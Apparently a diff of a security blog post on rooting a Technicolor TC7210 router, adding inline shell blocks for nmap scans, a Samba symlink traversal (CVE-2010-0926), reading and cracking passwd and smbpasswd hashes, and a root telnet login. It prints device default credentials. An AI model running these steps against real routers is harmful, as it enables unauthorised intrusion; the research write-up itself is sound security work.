@@ -41,7 +41,7 @@
     
   
   
-<meta itemprop="wordCount" content="945" />
+<meta itemprop="wordCount" content="2104" />
   
 
 
@@ -185,22 +185,113 @@ Rooting the Technicolor 7210
     
 <h3 id="what-to-try-next">What To Try Next</h3>
 <p>Scanning the router IP address didn&rsquo;t yield interesting results but on the other hand, scanning the IP address attributed to the NAS functionality proved to be a lot more interesting.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=nmap-port-scan.sh"></script>
-
-<p>Samba is a software that provides file and printer sharing using SMB/CIFS protocol. It has become a very important component to integrate Linux/Unix based systems into Windows based environments. Samba has had its fair share of vulnerabilities, so I decided to investigate it further.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=nmap-samba-scan.sh"></script>
-
-<p>It was possible to discover that the router uses Samba in its version 3.0.37. This version is vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926" title="CVE-2010-0926">CVE-2010-0926</a>. This vulnerability happens because the default configuration of <code>smbd</code>, allows a remote authenticated user to leverage directory traversals to access arbitrary files. To do that the user only needs to create a symbolic link (i.e. shortcut) on a writable share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>nmap -sS -T4 192.168.100.206 -PN -sV
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-03 09:48 CEST</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Nmap scan report for 192.168.100.206</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># Host is up (0.029s latency).</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># Not shown: 996 closed ports</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># PORT    STATE SERVICE     VERSION</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"># 21/tcp  open  ftp         BusyBox ftpd (D-Link DCS-932L IP-Cam camera)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic"># 80/tcp  open  http        BusyBox httpd 1.13</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic"># 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic"># MAC Address: 08:95:2A:80:24:67 (Technicolor CH USA)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># Service Info: OS: Linux; Device: webcam; CPE: cpe:/h:dlink:dcs-932l, cpe:/o:linux:linux_kernel</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds</span>
+</code></pre></div><p>Samba is a software that provides file and printer sharing using SMB/CIFS protocol. It has become a very important component to integrate Linux/Unix based systems into Windows based environments. Samba has had its fair share of vulnerabilities, so I decided to investigate it further.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>nmap -p <span style="color:#3677a9">445</span> 192.168.100.206 --script smb-os-discovery
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-03 09:53 CEST</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Nmap scan report for 192.168.100.206</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># Host is up (0.0031s latency).</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># PORT    STATE SERVICE</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic"># 445/tcp open  microsoft-ds</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic"># MAC Address: 08:95:2A:80:24:67 (Technicolor CH USA)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic"># Host script results:</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic"># | smb-os-discovery:</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># |   OS: Unix (Samba 3.0.37)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># |   NetBIOS computer name:</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># |   Workgroup: WORKGROUP\x00</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># |_  System time: 2018-06-03T08:41:51+00:00</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic"># Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds</span>
+</code></pre></div><p>It was possible to discover that the router uses Samba in its version 3.0.37. This version is vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926" title="CVE-2010-0926">CVE-2010-0926</a>. This vulnerability happens because the default configuration of <code>smbd</code>, allows a remote authenticated user to leverage directory traversals to access arbitrary files. To do that the user only needs to create a symbolic link (i.e. shortcut) on a writable share.</p>
 <h3 id="exploiting-the-flaw">Exploiting The Flaw</h3>
 <p>After connecting a USB drive in the router and configuring a file share called <code>test</code>, I connected using the <code>smbclient</code> utility and by using its <code>symlink</code> command to create a symbolic link to the root directory I was able to confirm that the NAS Samba installation is indeed vulnerable.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=smbclient-browse.sh"></script>
-
-<p>I proceeded to download the entire file system. One thing that I noticed, was that the file system didn&rsquo;t contain any file related with the router web management interface (e.g. images, web pages, etc.) I assumed that was related with the fact that the user context in which the <code>smbd</code> daemon was running didn&rsquo;t have the permission to access those files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>smbclient <span style="color:#ed9d13">\\\\</span>192.168.100.10<span style="color:#ed9d13">\\</span><span style="color:#24909d">test</span> -N
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.37]</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Server not using user level security and no password supplied.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># smb: \&gt; symlink ../../../ root</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># smb: \&gt; ls</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic">#   .                                   D        0  Sun Oct 30 10:45:18 2016</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic">#   ..                                  D        0  Sun Oct 30 10:44:13 2016</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic">#   lost+found                          D        0  Sun Oct 30 10:29:58 2016</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic">#   root                                D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic">#                 7782036 blocks of size 1024. 7369340 blocks available</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># smb: \&gt; cd root\</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># smb: \root\&gt; ls</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic">#   .                                   D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic">#   ..                                  D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic">#   CVS                                 D        0  Wed Mar  4 06:29:42 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic">#   bin                                 D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic">#   dev                                 D        0  Wed Mar  4 06:43:18 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#999;font-style:italic">#   etc                                 D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span><span style="color:#999;font-style:italic">#   lib                                 D        0  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#999;font-style:italic">#   mnt                                 D        0  Thu Jan  1 01:00:30 1970</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span><span style="color:#999;font-style:italic">#   tmp                                 D        0  Sun Oct 30 10:44:15 2016</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span><span style="color:#999;font-style:italic">#   sys                                 D        0  Thu Jan  1 01:00:00 1970</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span><span style="color:#999;font-style:italic">#   var                                 D        0  Sun Oct 30 08:52:58 2016</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span><span style="color:#999;font-style:italic">#   usr                                 D        0  Wed Mar  4 06:37:30 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span><span style="color:#999;font-style:italic">#   data                                D        0  Wed Mar  4 06:43:11 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span><span style="color:#999;font-style:italic">#   init                                A   526180  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span><span style="color:#999;font-style:italic">#   proc                               DR        0  Thu Jan  1 01:00:00 1970</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span><span style="color:#999;font-style:italic">#   sbin                                D        0  Wed Mar  4 06:42:03 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span><span style="color:#999;font-style:italic">#   linuxrc                             A   526180  Wed Mar  4 06:43:12 2015</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span><span style="color:#999;font-style:italic">#                 7782036 blocks of size 1024. 7369340 blocks available</span>
+</code></pre></div><p>I proceeded to download the entire file system. One thing that I noticed, was that the file system didn&rsquo;t contain any file related with the router web management interface (e.g. images, web pages, etc.) I assumed that was related with the fact that the user context in which the <code>smbd</code> daemon was running didn&rsquo;t have the permission to access those files.</p>
 <h3 id="weak-credentials">Weak Credentials</h3>
 <p>Not lingering too much on that, I decided to investigate what credentials I could find on the file system dump. As can be seen bellow, it was quite easy to crack the passwords found, they are quite simple and reused across all user accounts.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=cracking-passwords.sh"></script>
-
-<p>The next step was to focus on the binaries present on the file system. The following binaries seemed interesting (i.e. not Busybox related): <code>mscapp</code>, <code>smbapp</code>, <code>setappsver</code>, <code>remoteapi</code>, <code>rpc_test_client</code> and <code>rpc_test_server</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>cat etc/passwd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># root:OgKnQyJxrFabg:0:0:root:/:/bin/sh</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># admin:pM3SFcK2.v1rk:0:0:Administrator:/:/bin/false</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># support:DhsvlEFjJIDO2:0:0:Technical Support:/:/bin/false</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># user:el3H9xuqK1naE:0:0:Normal User:/:/bin/false</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># nobody:28nxEPGl5Ifik:1:0:nobody for ftp:/:/bin/false</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>wc -l passwords.txt
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># 38633349 passwords.txt</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>john --wordlist=passwords.txt etc/passwd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># Loaded 5 password hashes with 5 different salts (Traditional DES [128/128 BS AVX-16])</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#999;font-style:italic"># broadcom         (nobody)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># broadcom         (admin)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic"># broadcom         (root)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span><span style="color:#999;font-style:italic"># broadcom         (support)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#999;font-style:italic"># broadcom         (user)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span><span style="color:#999;font-style:italic"># guesses: 5  time: 0:00:00:03 DONE (Sun Oct 30 12:01:38 2016)  c/s: 13902K  trying: BRITGIRL - brokosz</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span><span style="color:#999;font-style:italic"># Use the &#34;--show&#34; option to display all of the cracked passwords reliably</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>cat etc/group
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span><span style="color:#999;font-style:italic"># root::0:root,admin,support,user</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>cat etc/samba/smbpasswd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span><span style="color:#999;font-style:italic"># admin:0:F0D412BD764FFE81AAD3B435B51404EE:209C6174DA490CAEB422F3FA5A7AE634:[U          ]:LCT-5815A6F4:</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>john --wordlist=passwords.txt --format=nt etc/samba/smbpasswd
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span><span style="color:#999;font-style:italic"># Loaded 1 password hash (NT MD4 [128/128 X2 SSE2-16])</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span><span style="color:#999;font-style:italic"># admin            (admin)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span><span style="color:#999;font-style:italic"># guesses: 1  time: 0:00:00:00 DONE (Sun Oct 30 12:15:04 2016)  c/s: 9581K  trying: Admiller0 - !@#admin</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span><span style="color:#999;font-style:italic"># Use the &#34;--show&#34; option to display all of the cracked passwords reliably</span>
+</code></pre></div><p>The next step was to focus on the binaries present on the file system. The following binaries seemed interesting (i.e. not Busybox related): <code>mscapp</code>, <code>smbapp</code>, <code>setappsver</code>, <code>remoteapi</code>, <code>rpc_test_client</code> and <code>rpc_test_server</code>.</p>
 <h3 id="the-holly-grail">The Holly Grail</h3>
 <p>From all the strings dumped from these binaries, the string <code>(echo %s; echo %s) |/bin/smbpasswd -as admin</code> stood out. Taking into account the name of the application that contained it, <code>smbapp</code>, it was clear that this binary is the one that is used to manage the NAS file sharing functionality.</p>
 <p>Breaking down the commands in that string we have:</p>
@@ -217,14 +308,131 @@ Rooting the Technicolor 7210
     </a><figcaption class="figure-caption text-center">Changing the file share administrator password.</figcaption></figure></div>
 
 <p>After submiting the form, I was able to confirm that the functionality is indeed vulnerable to RCE as the connection using a Telnet client was successful and the credentials found before (i.e. user <code>root</code> and password <code>broadcom</code>) were valid.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=connect-telnet.sh"></script>
-
-<h3 id="conclusions">Conclusions</h3>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#cd2828;font-weight:bold"></span>telnet 192.168.100.10
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># Trying 192.168.100.10...</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#999;font-style:italic"># Connected to 192.168.100.10.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#999;font-style:italic"># Escape character is &#39;^]&#39;.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#999;font-style:italic"># (none) login: root</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#999;font-style:italic"># Password:</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># BusyBox v1.19.3 (2015-03-04 13:37:03 CST) built-in shell (ash)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#999;font-style:italic"># Enter &#39;help&#39; for a list of built-in commands.</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#999;font-style:italic"># ~ #</span>
+</code></pre></div><h3 id="conclusions">Conclusions</h3>
 <p>Rummaging through the file system once again, I was unable to find any files related with the router management web interface (very strange since now I was connected with the <code>root</code> user).</p>
 <p>After searching the Internet for answers, I found out that the TC7210 is a dual Operative System (OS) network appliance. For the network functionality, it uses the eCos real-time OS, and for the NAS functionality, it uses an embedded Linux based OS. I was able to get <code>root</code> access on the latter.</p>
-<script type="application/javascript" src="https://gist.github.com/serializingme/a97cfa316006d352c9f9c7ff32e9ab90.js?file=investigating.sh"></script>
-
-<p>I was quite suprised at the specifications of the NAS part of the router. With the CPU it boasts amount of available memory and storage, there is the possibility to run some more software on it (e.g. VPN, Torrent, etc.) If one is wiling to <a href="https://github.com/tch-opensrc/" title="Technicolor open source repository for TC7210/TC7230 models">cross-compile</a> them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  1</span><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  2</span><span style="color:#cd2828;font-weight:bold"></span>uname -a
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  3</span><span style="color:#999;font-style:italic"># Linux (none) 2.6.30-1.0.10mp3 #1 SMP Wed Mar 4 13:36:40 CST 2015 mips GNU/Linux</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  5</span>cat /proc/cpuinfo
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  6</span><span style="color:#999;font-style:italic"># system type             : BCM3384 Cable Modem</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  7</span><span style="color:#999;font-style:italic"># processor               : 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  8</span><span style="color:#999;font-style:italic"># cpu model               : Broadcom BMIPS5000 V1.1  FPU V0.1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">  9</span><span style="color:#999;font-style:italic"># BogoMIPS                : 667.64</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 10</span><span style="color:#999;font-style:italic"># wait instruction        : no</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 11</span><span style="color:#999;font-style:italic"># microsecond timers      : yes</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 12</span><span style="color:#999;font-style:italic"># tlb_entries             : 64</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 13</span><span style="color:#999;font-style:italic"># extra interrupt vector  : yes</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 14</span><span style="color:#999;font-style:italic"># hardware watchpoint     : no</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 15</span><span style="color:#999;font-style:italic"># ASEs implemented        :</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 16</span><span style="color:#999;font-style:italic"># shadow register sets    : 1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 17</span><span style="color:#999;font-style:italic"># core                    : 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 18</span><span style="color:#999;font-style:italic"># VCED exceptions         : not available</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 19</span><span style="color:#999;font-style:italic"># VCEI exceptions         : not available</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 20</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 21</span><span style="color:#999;font-style:italic"># processor               : 1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 22</span><span style="color:#999;font-style:italic"># cpu model               : Broadcom BMIPS5000 V1.1  FPU V0.1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 23</span><span style="color:#999;font-style:italic"># BogoMIPS                : 502.78</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 24</span><span style="color:#999;font-style:italic"># wait instruction        : no</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 25</span><span style="color:#999;font-style:italic"># microsecond timers      : yes</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 26</span><span style="color:#999;font-style:italic"># tlb_entries             : 64</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 27</span><span style="color:#999;font-style:italic"># extra interrupt vector  : yes</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 28</span><span style="color:#999;font-style:italic"># hardware watchpoint     : no</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 29</span><span style="color:#999;font-style:italic"># ASEs implemented        :</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 30</span><span style="color:#999;font-style:italic"># shadow register sets    : 1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 31</span><span style="color:#999;font-style:italic"># core                    : 0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 32</span><span style="color:#999;font-style:italic"># VCED exceptions         : not available</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 33</span><span style="color:#999;font-style:italic"># VCEI exceptions         : not available</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 34</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 35</span>cat /proc/meminfo
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 36</span><span style="color:#999;font-style:italic"># MemTotal:         124304 kB</span>
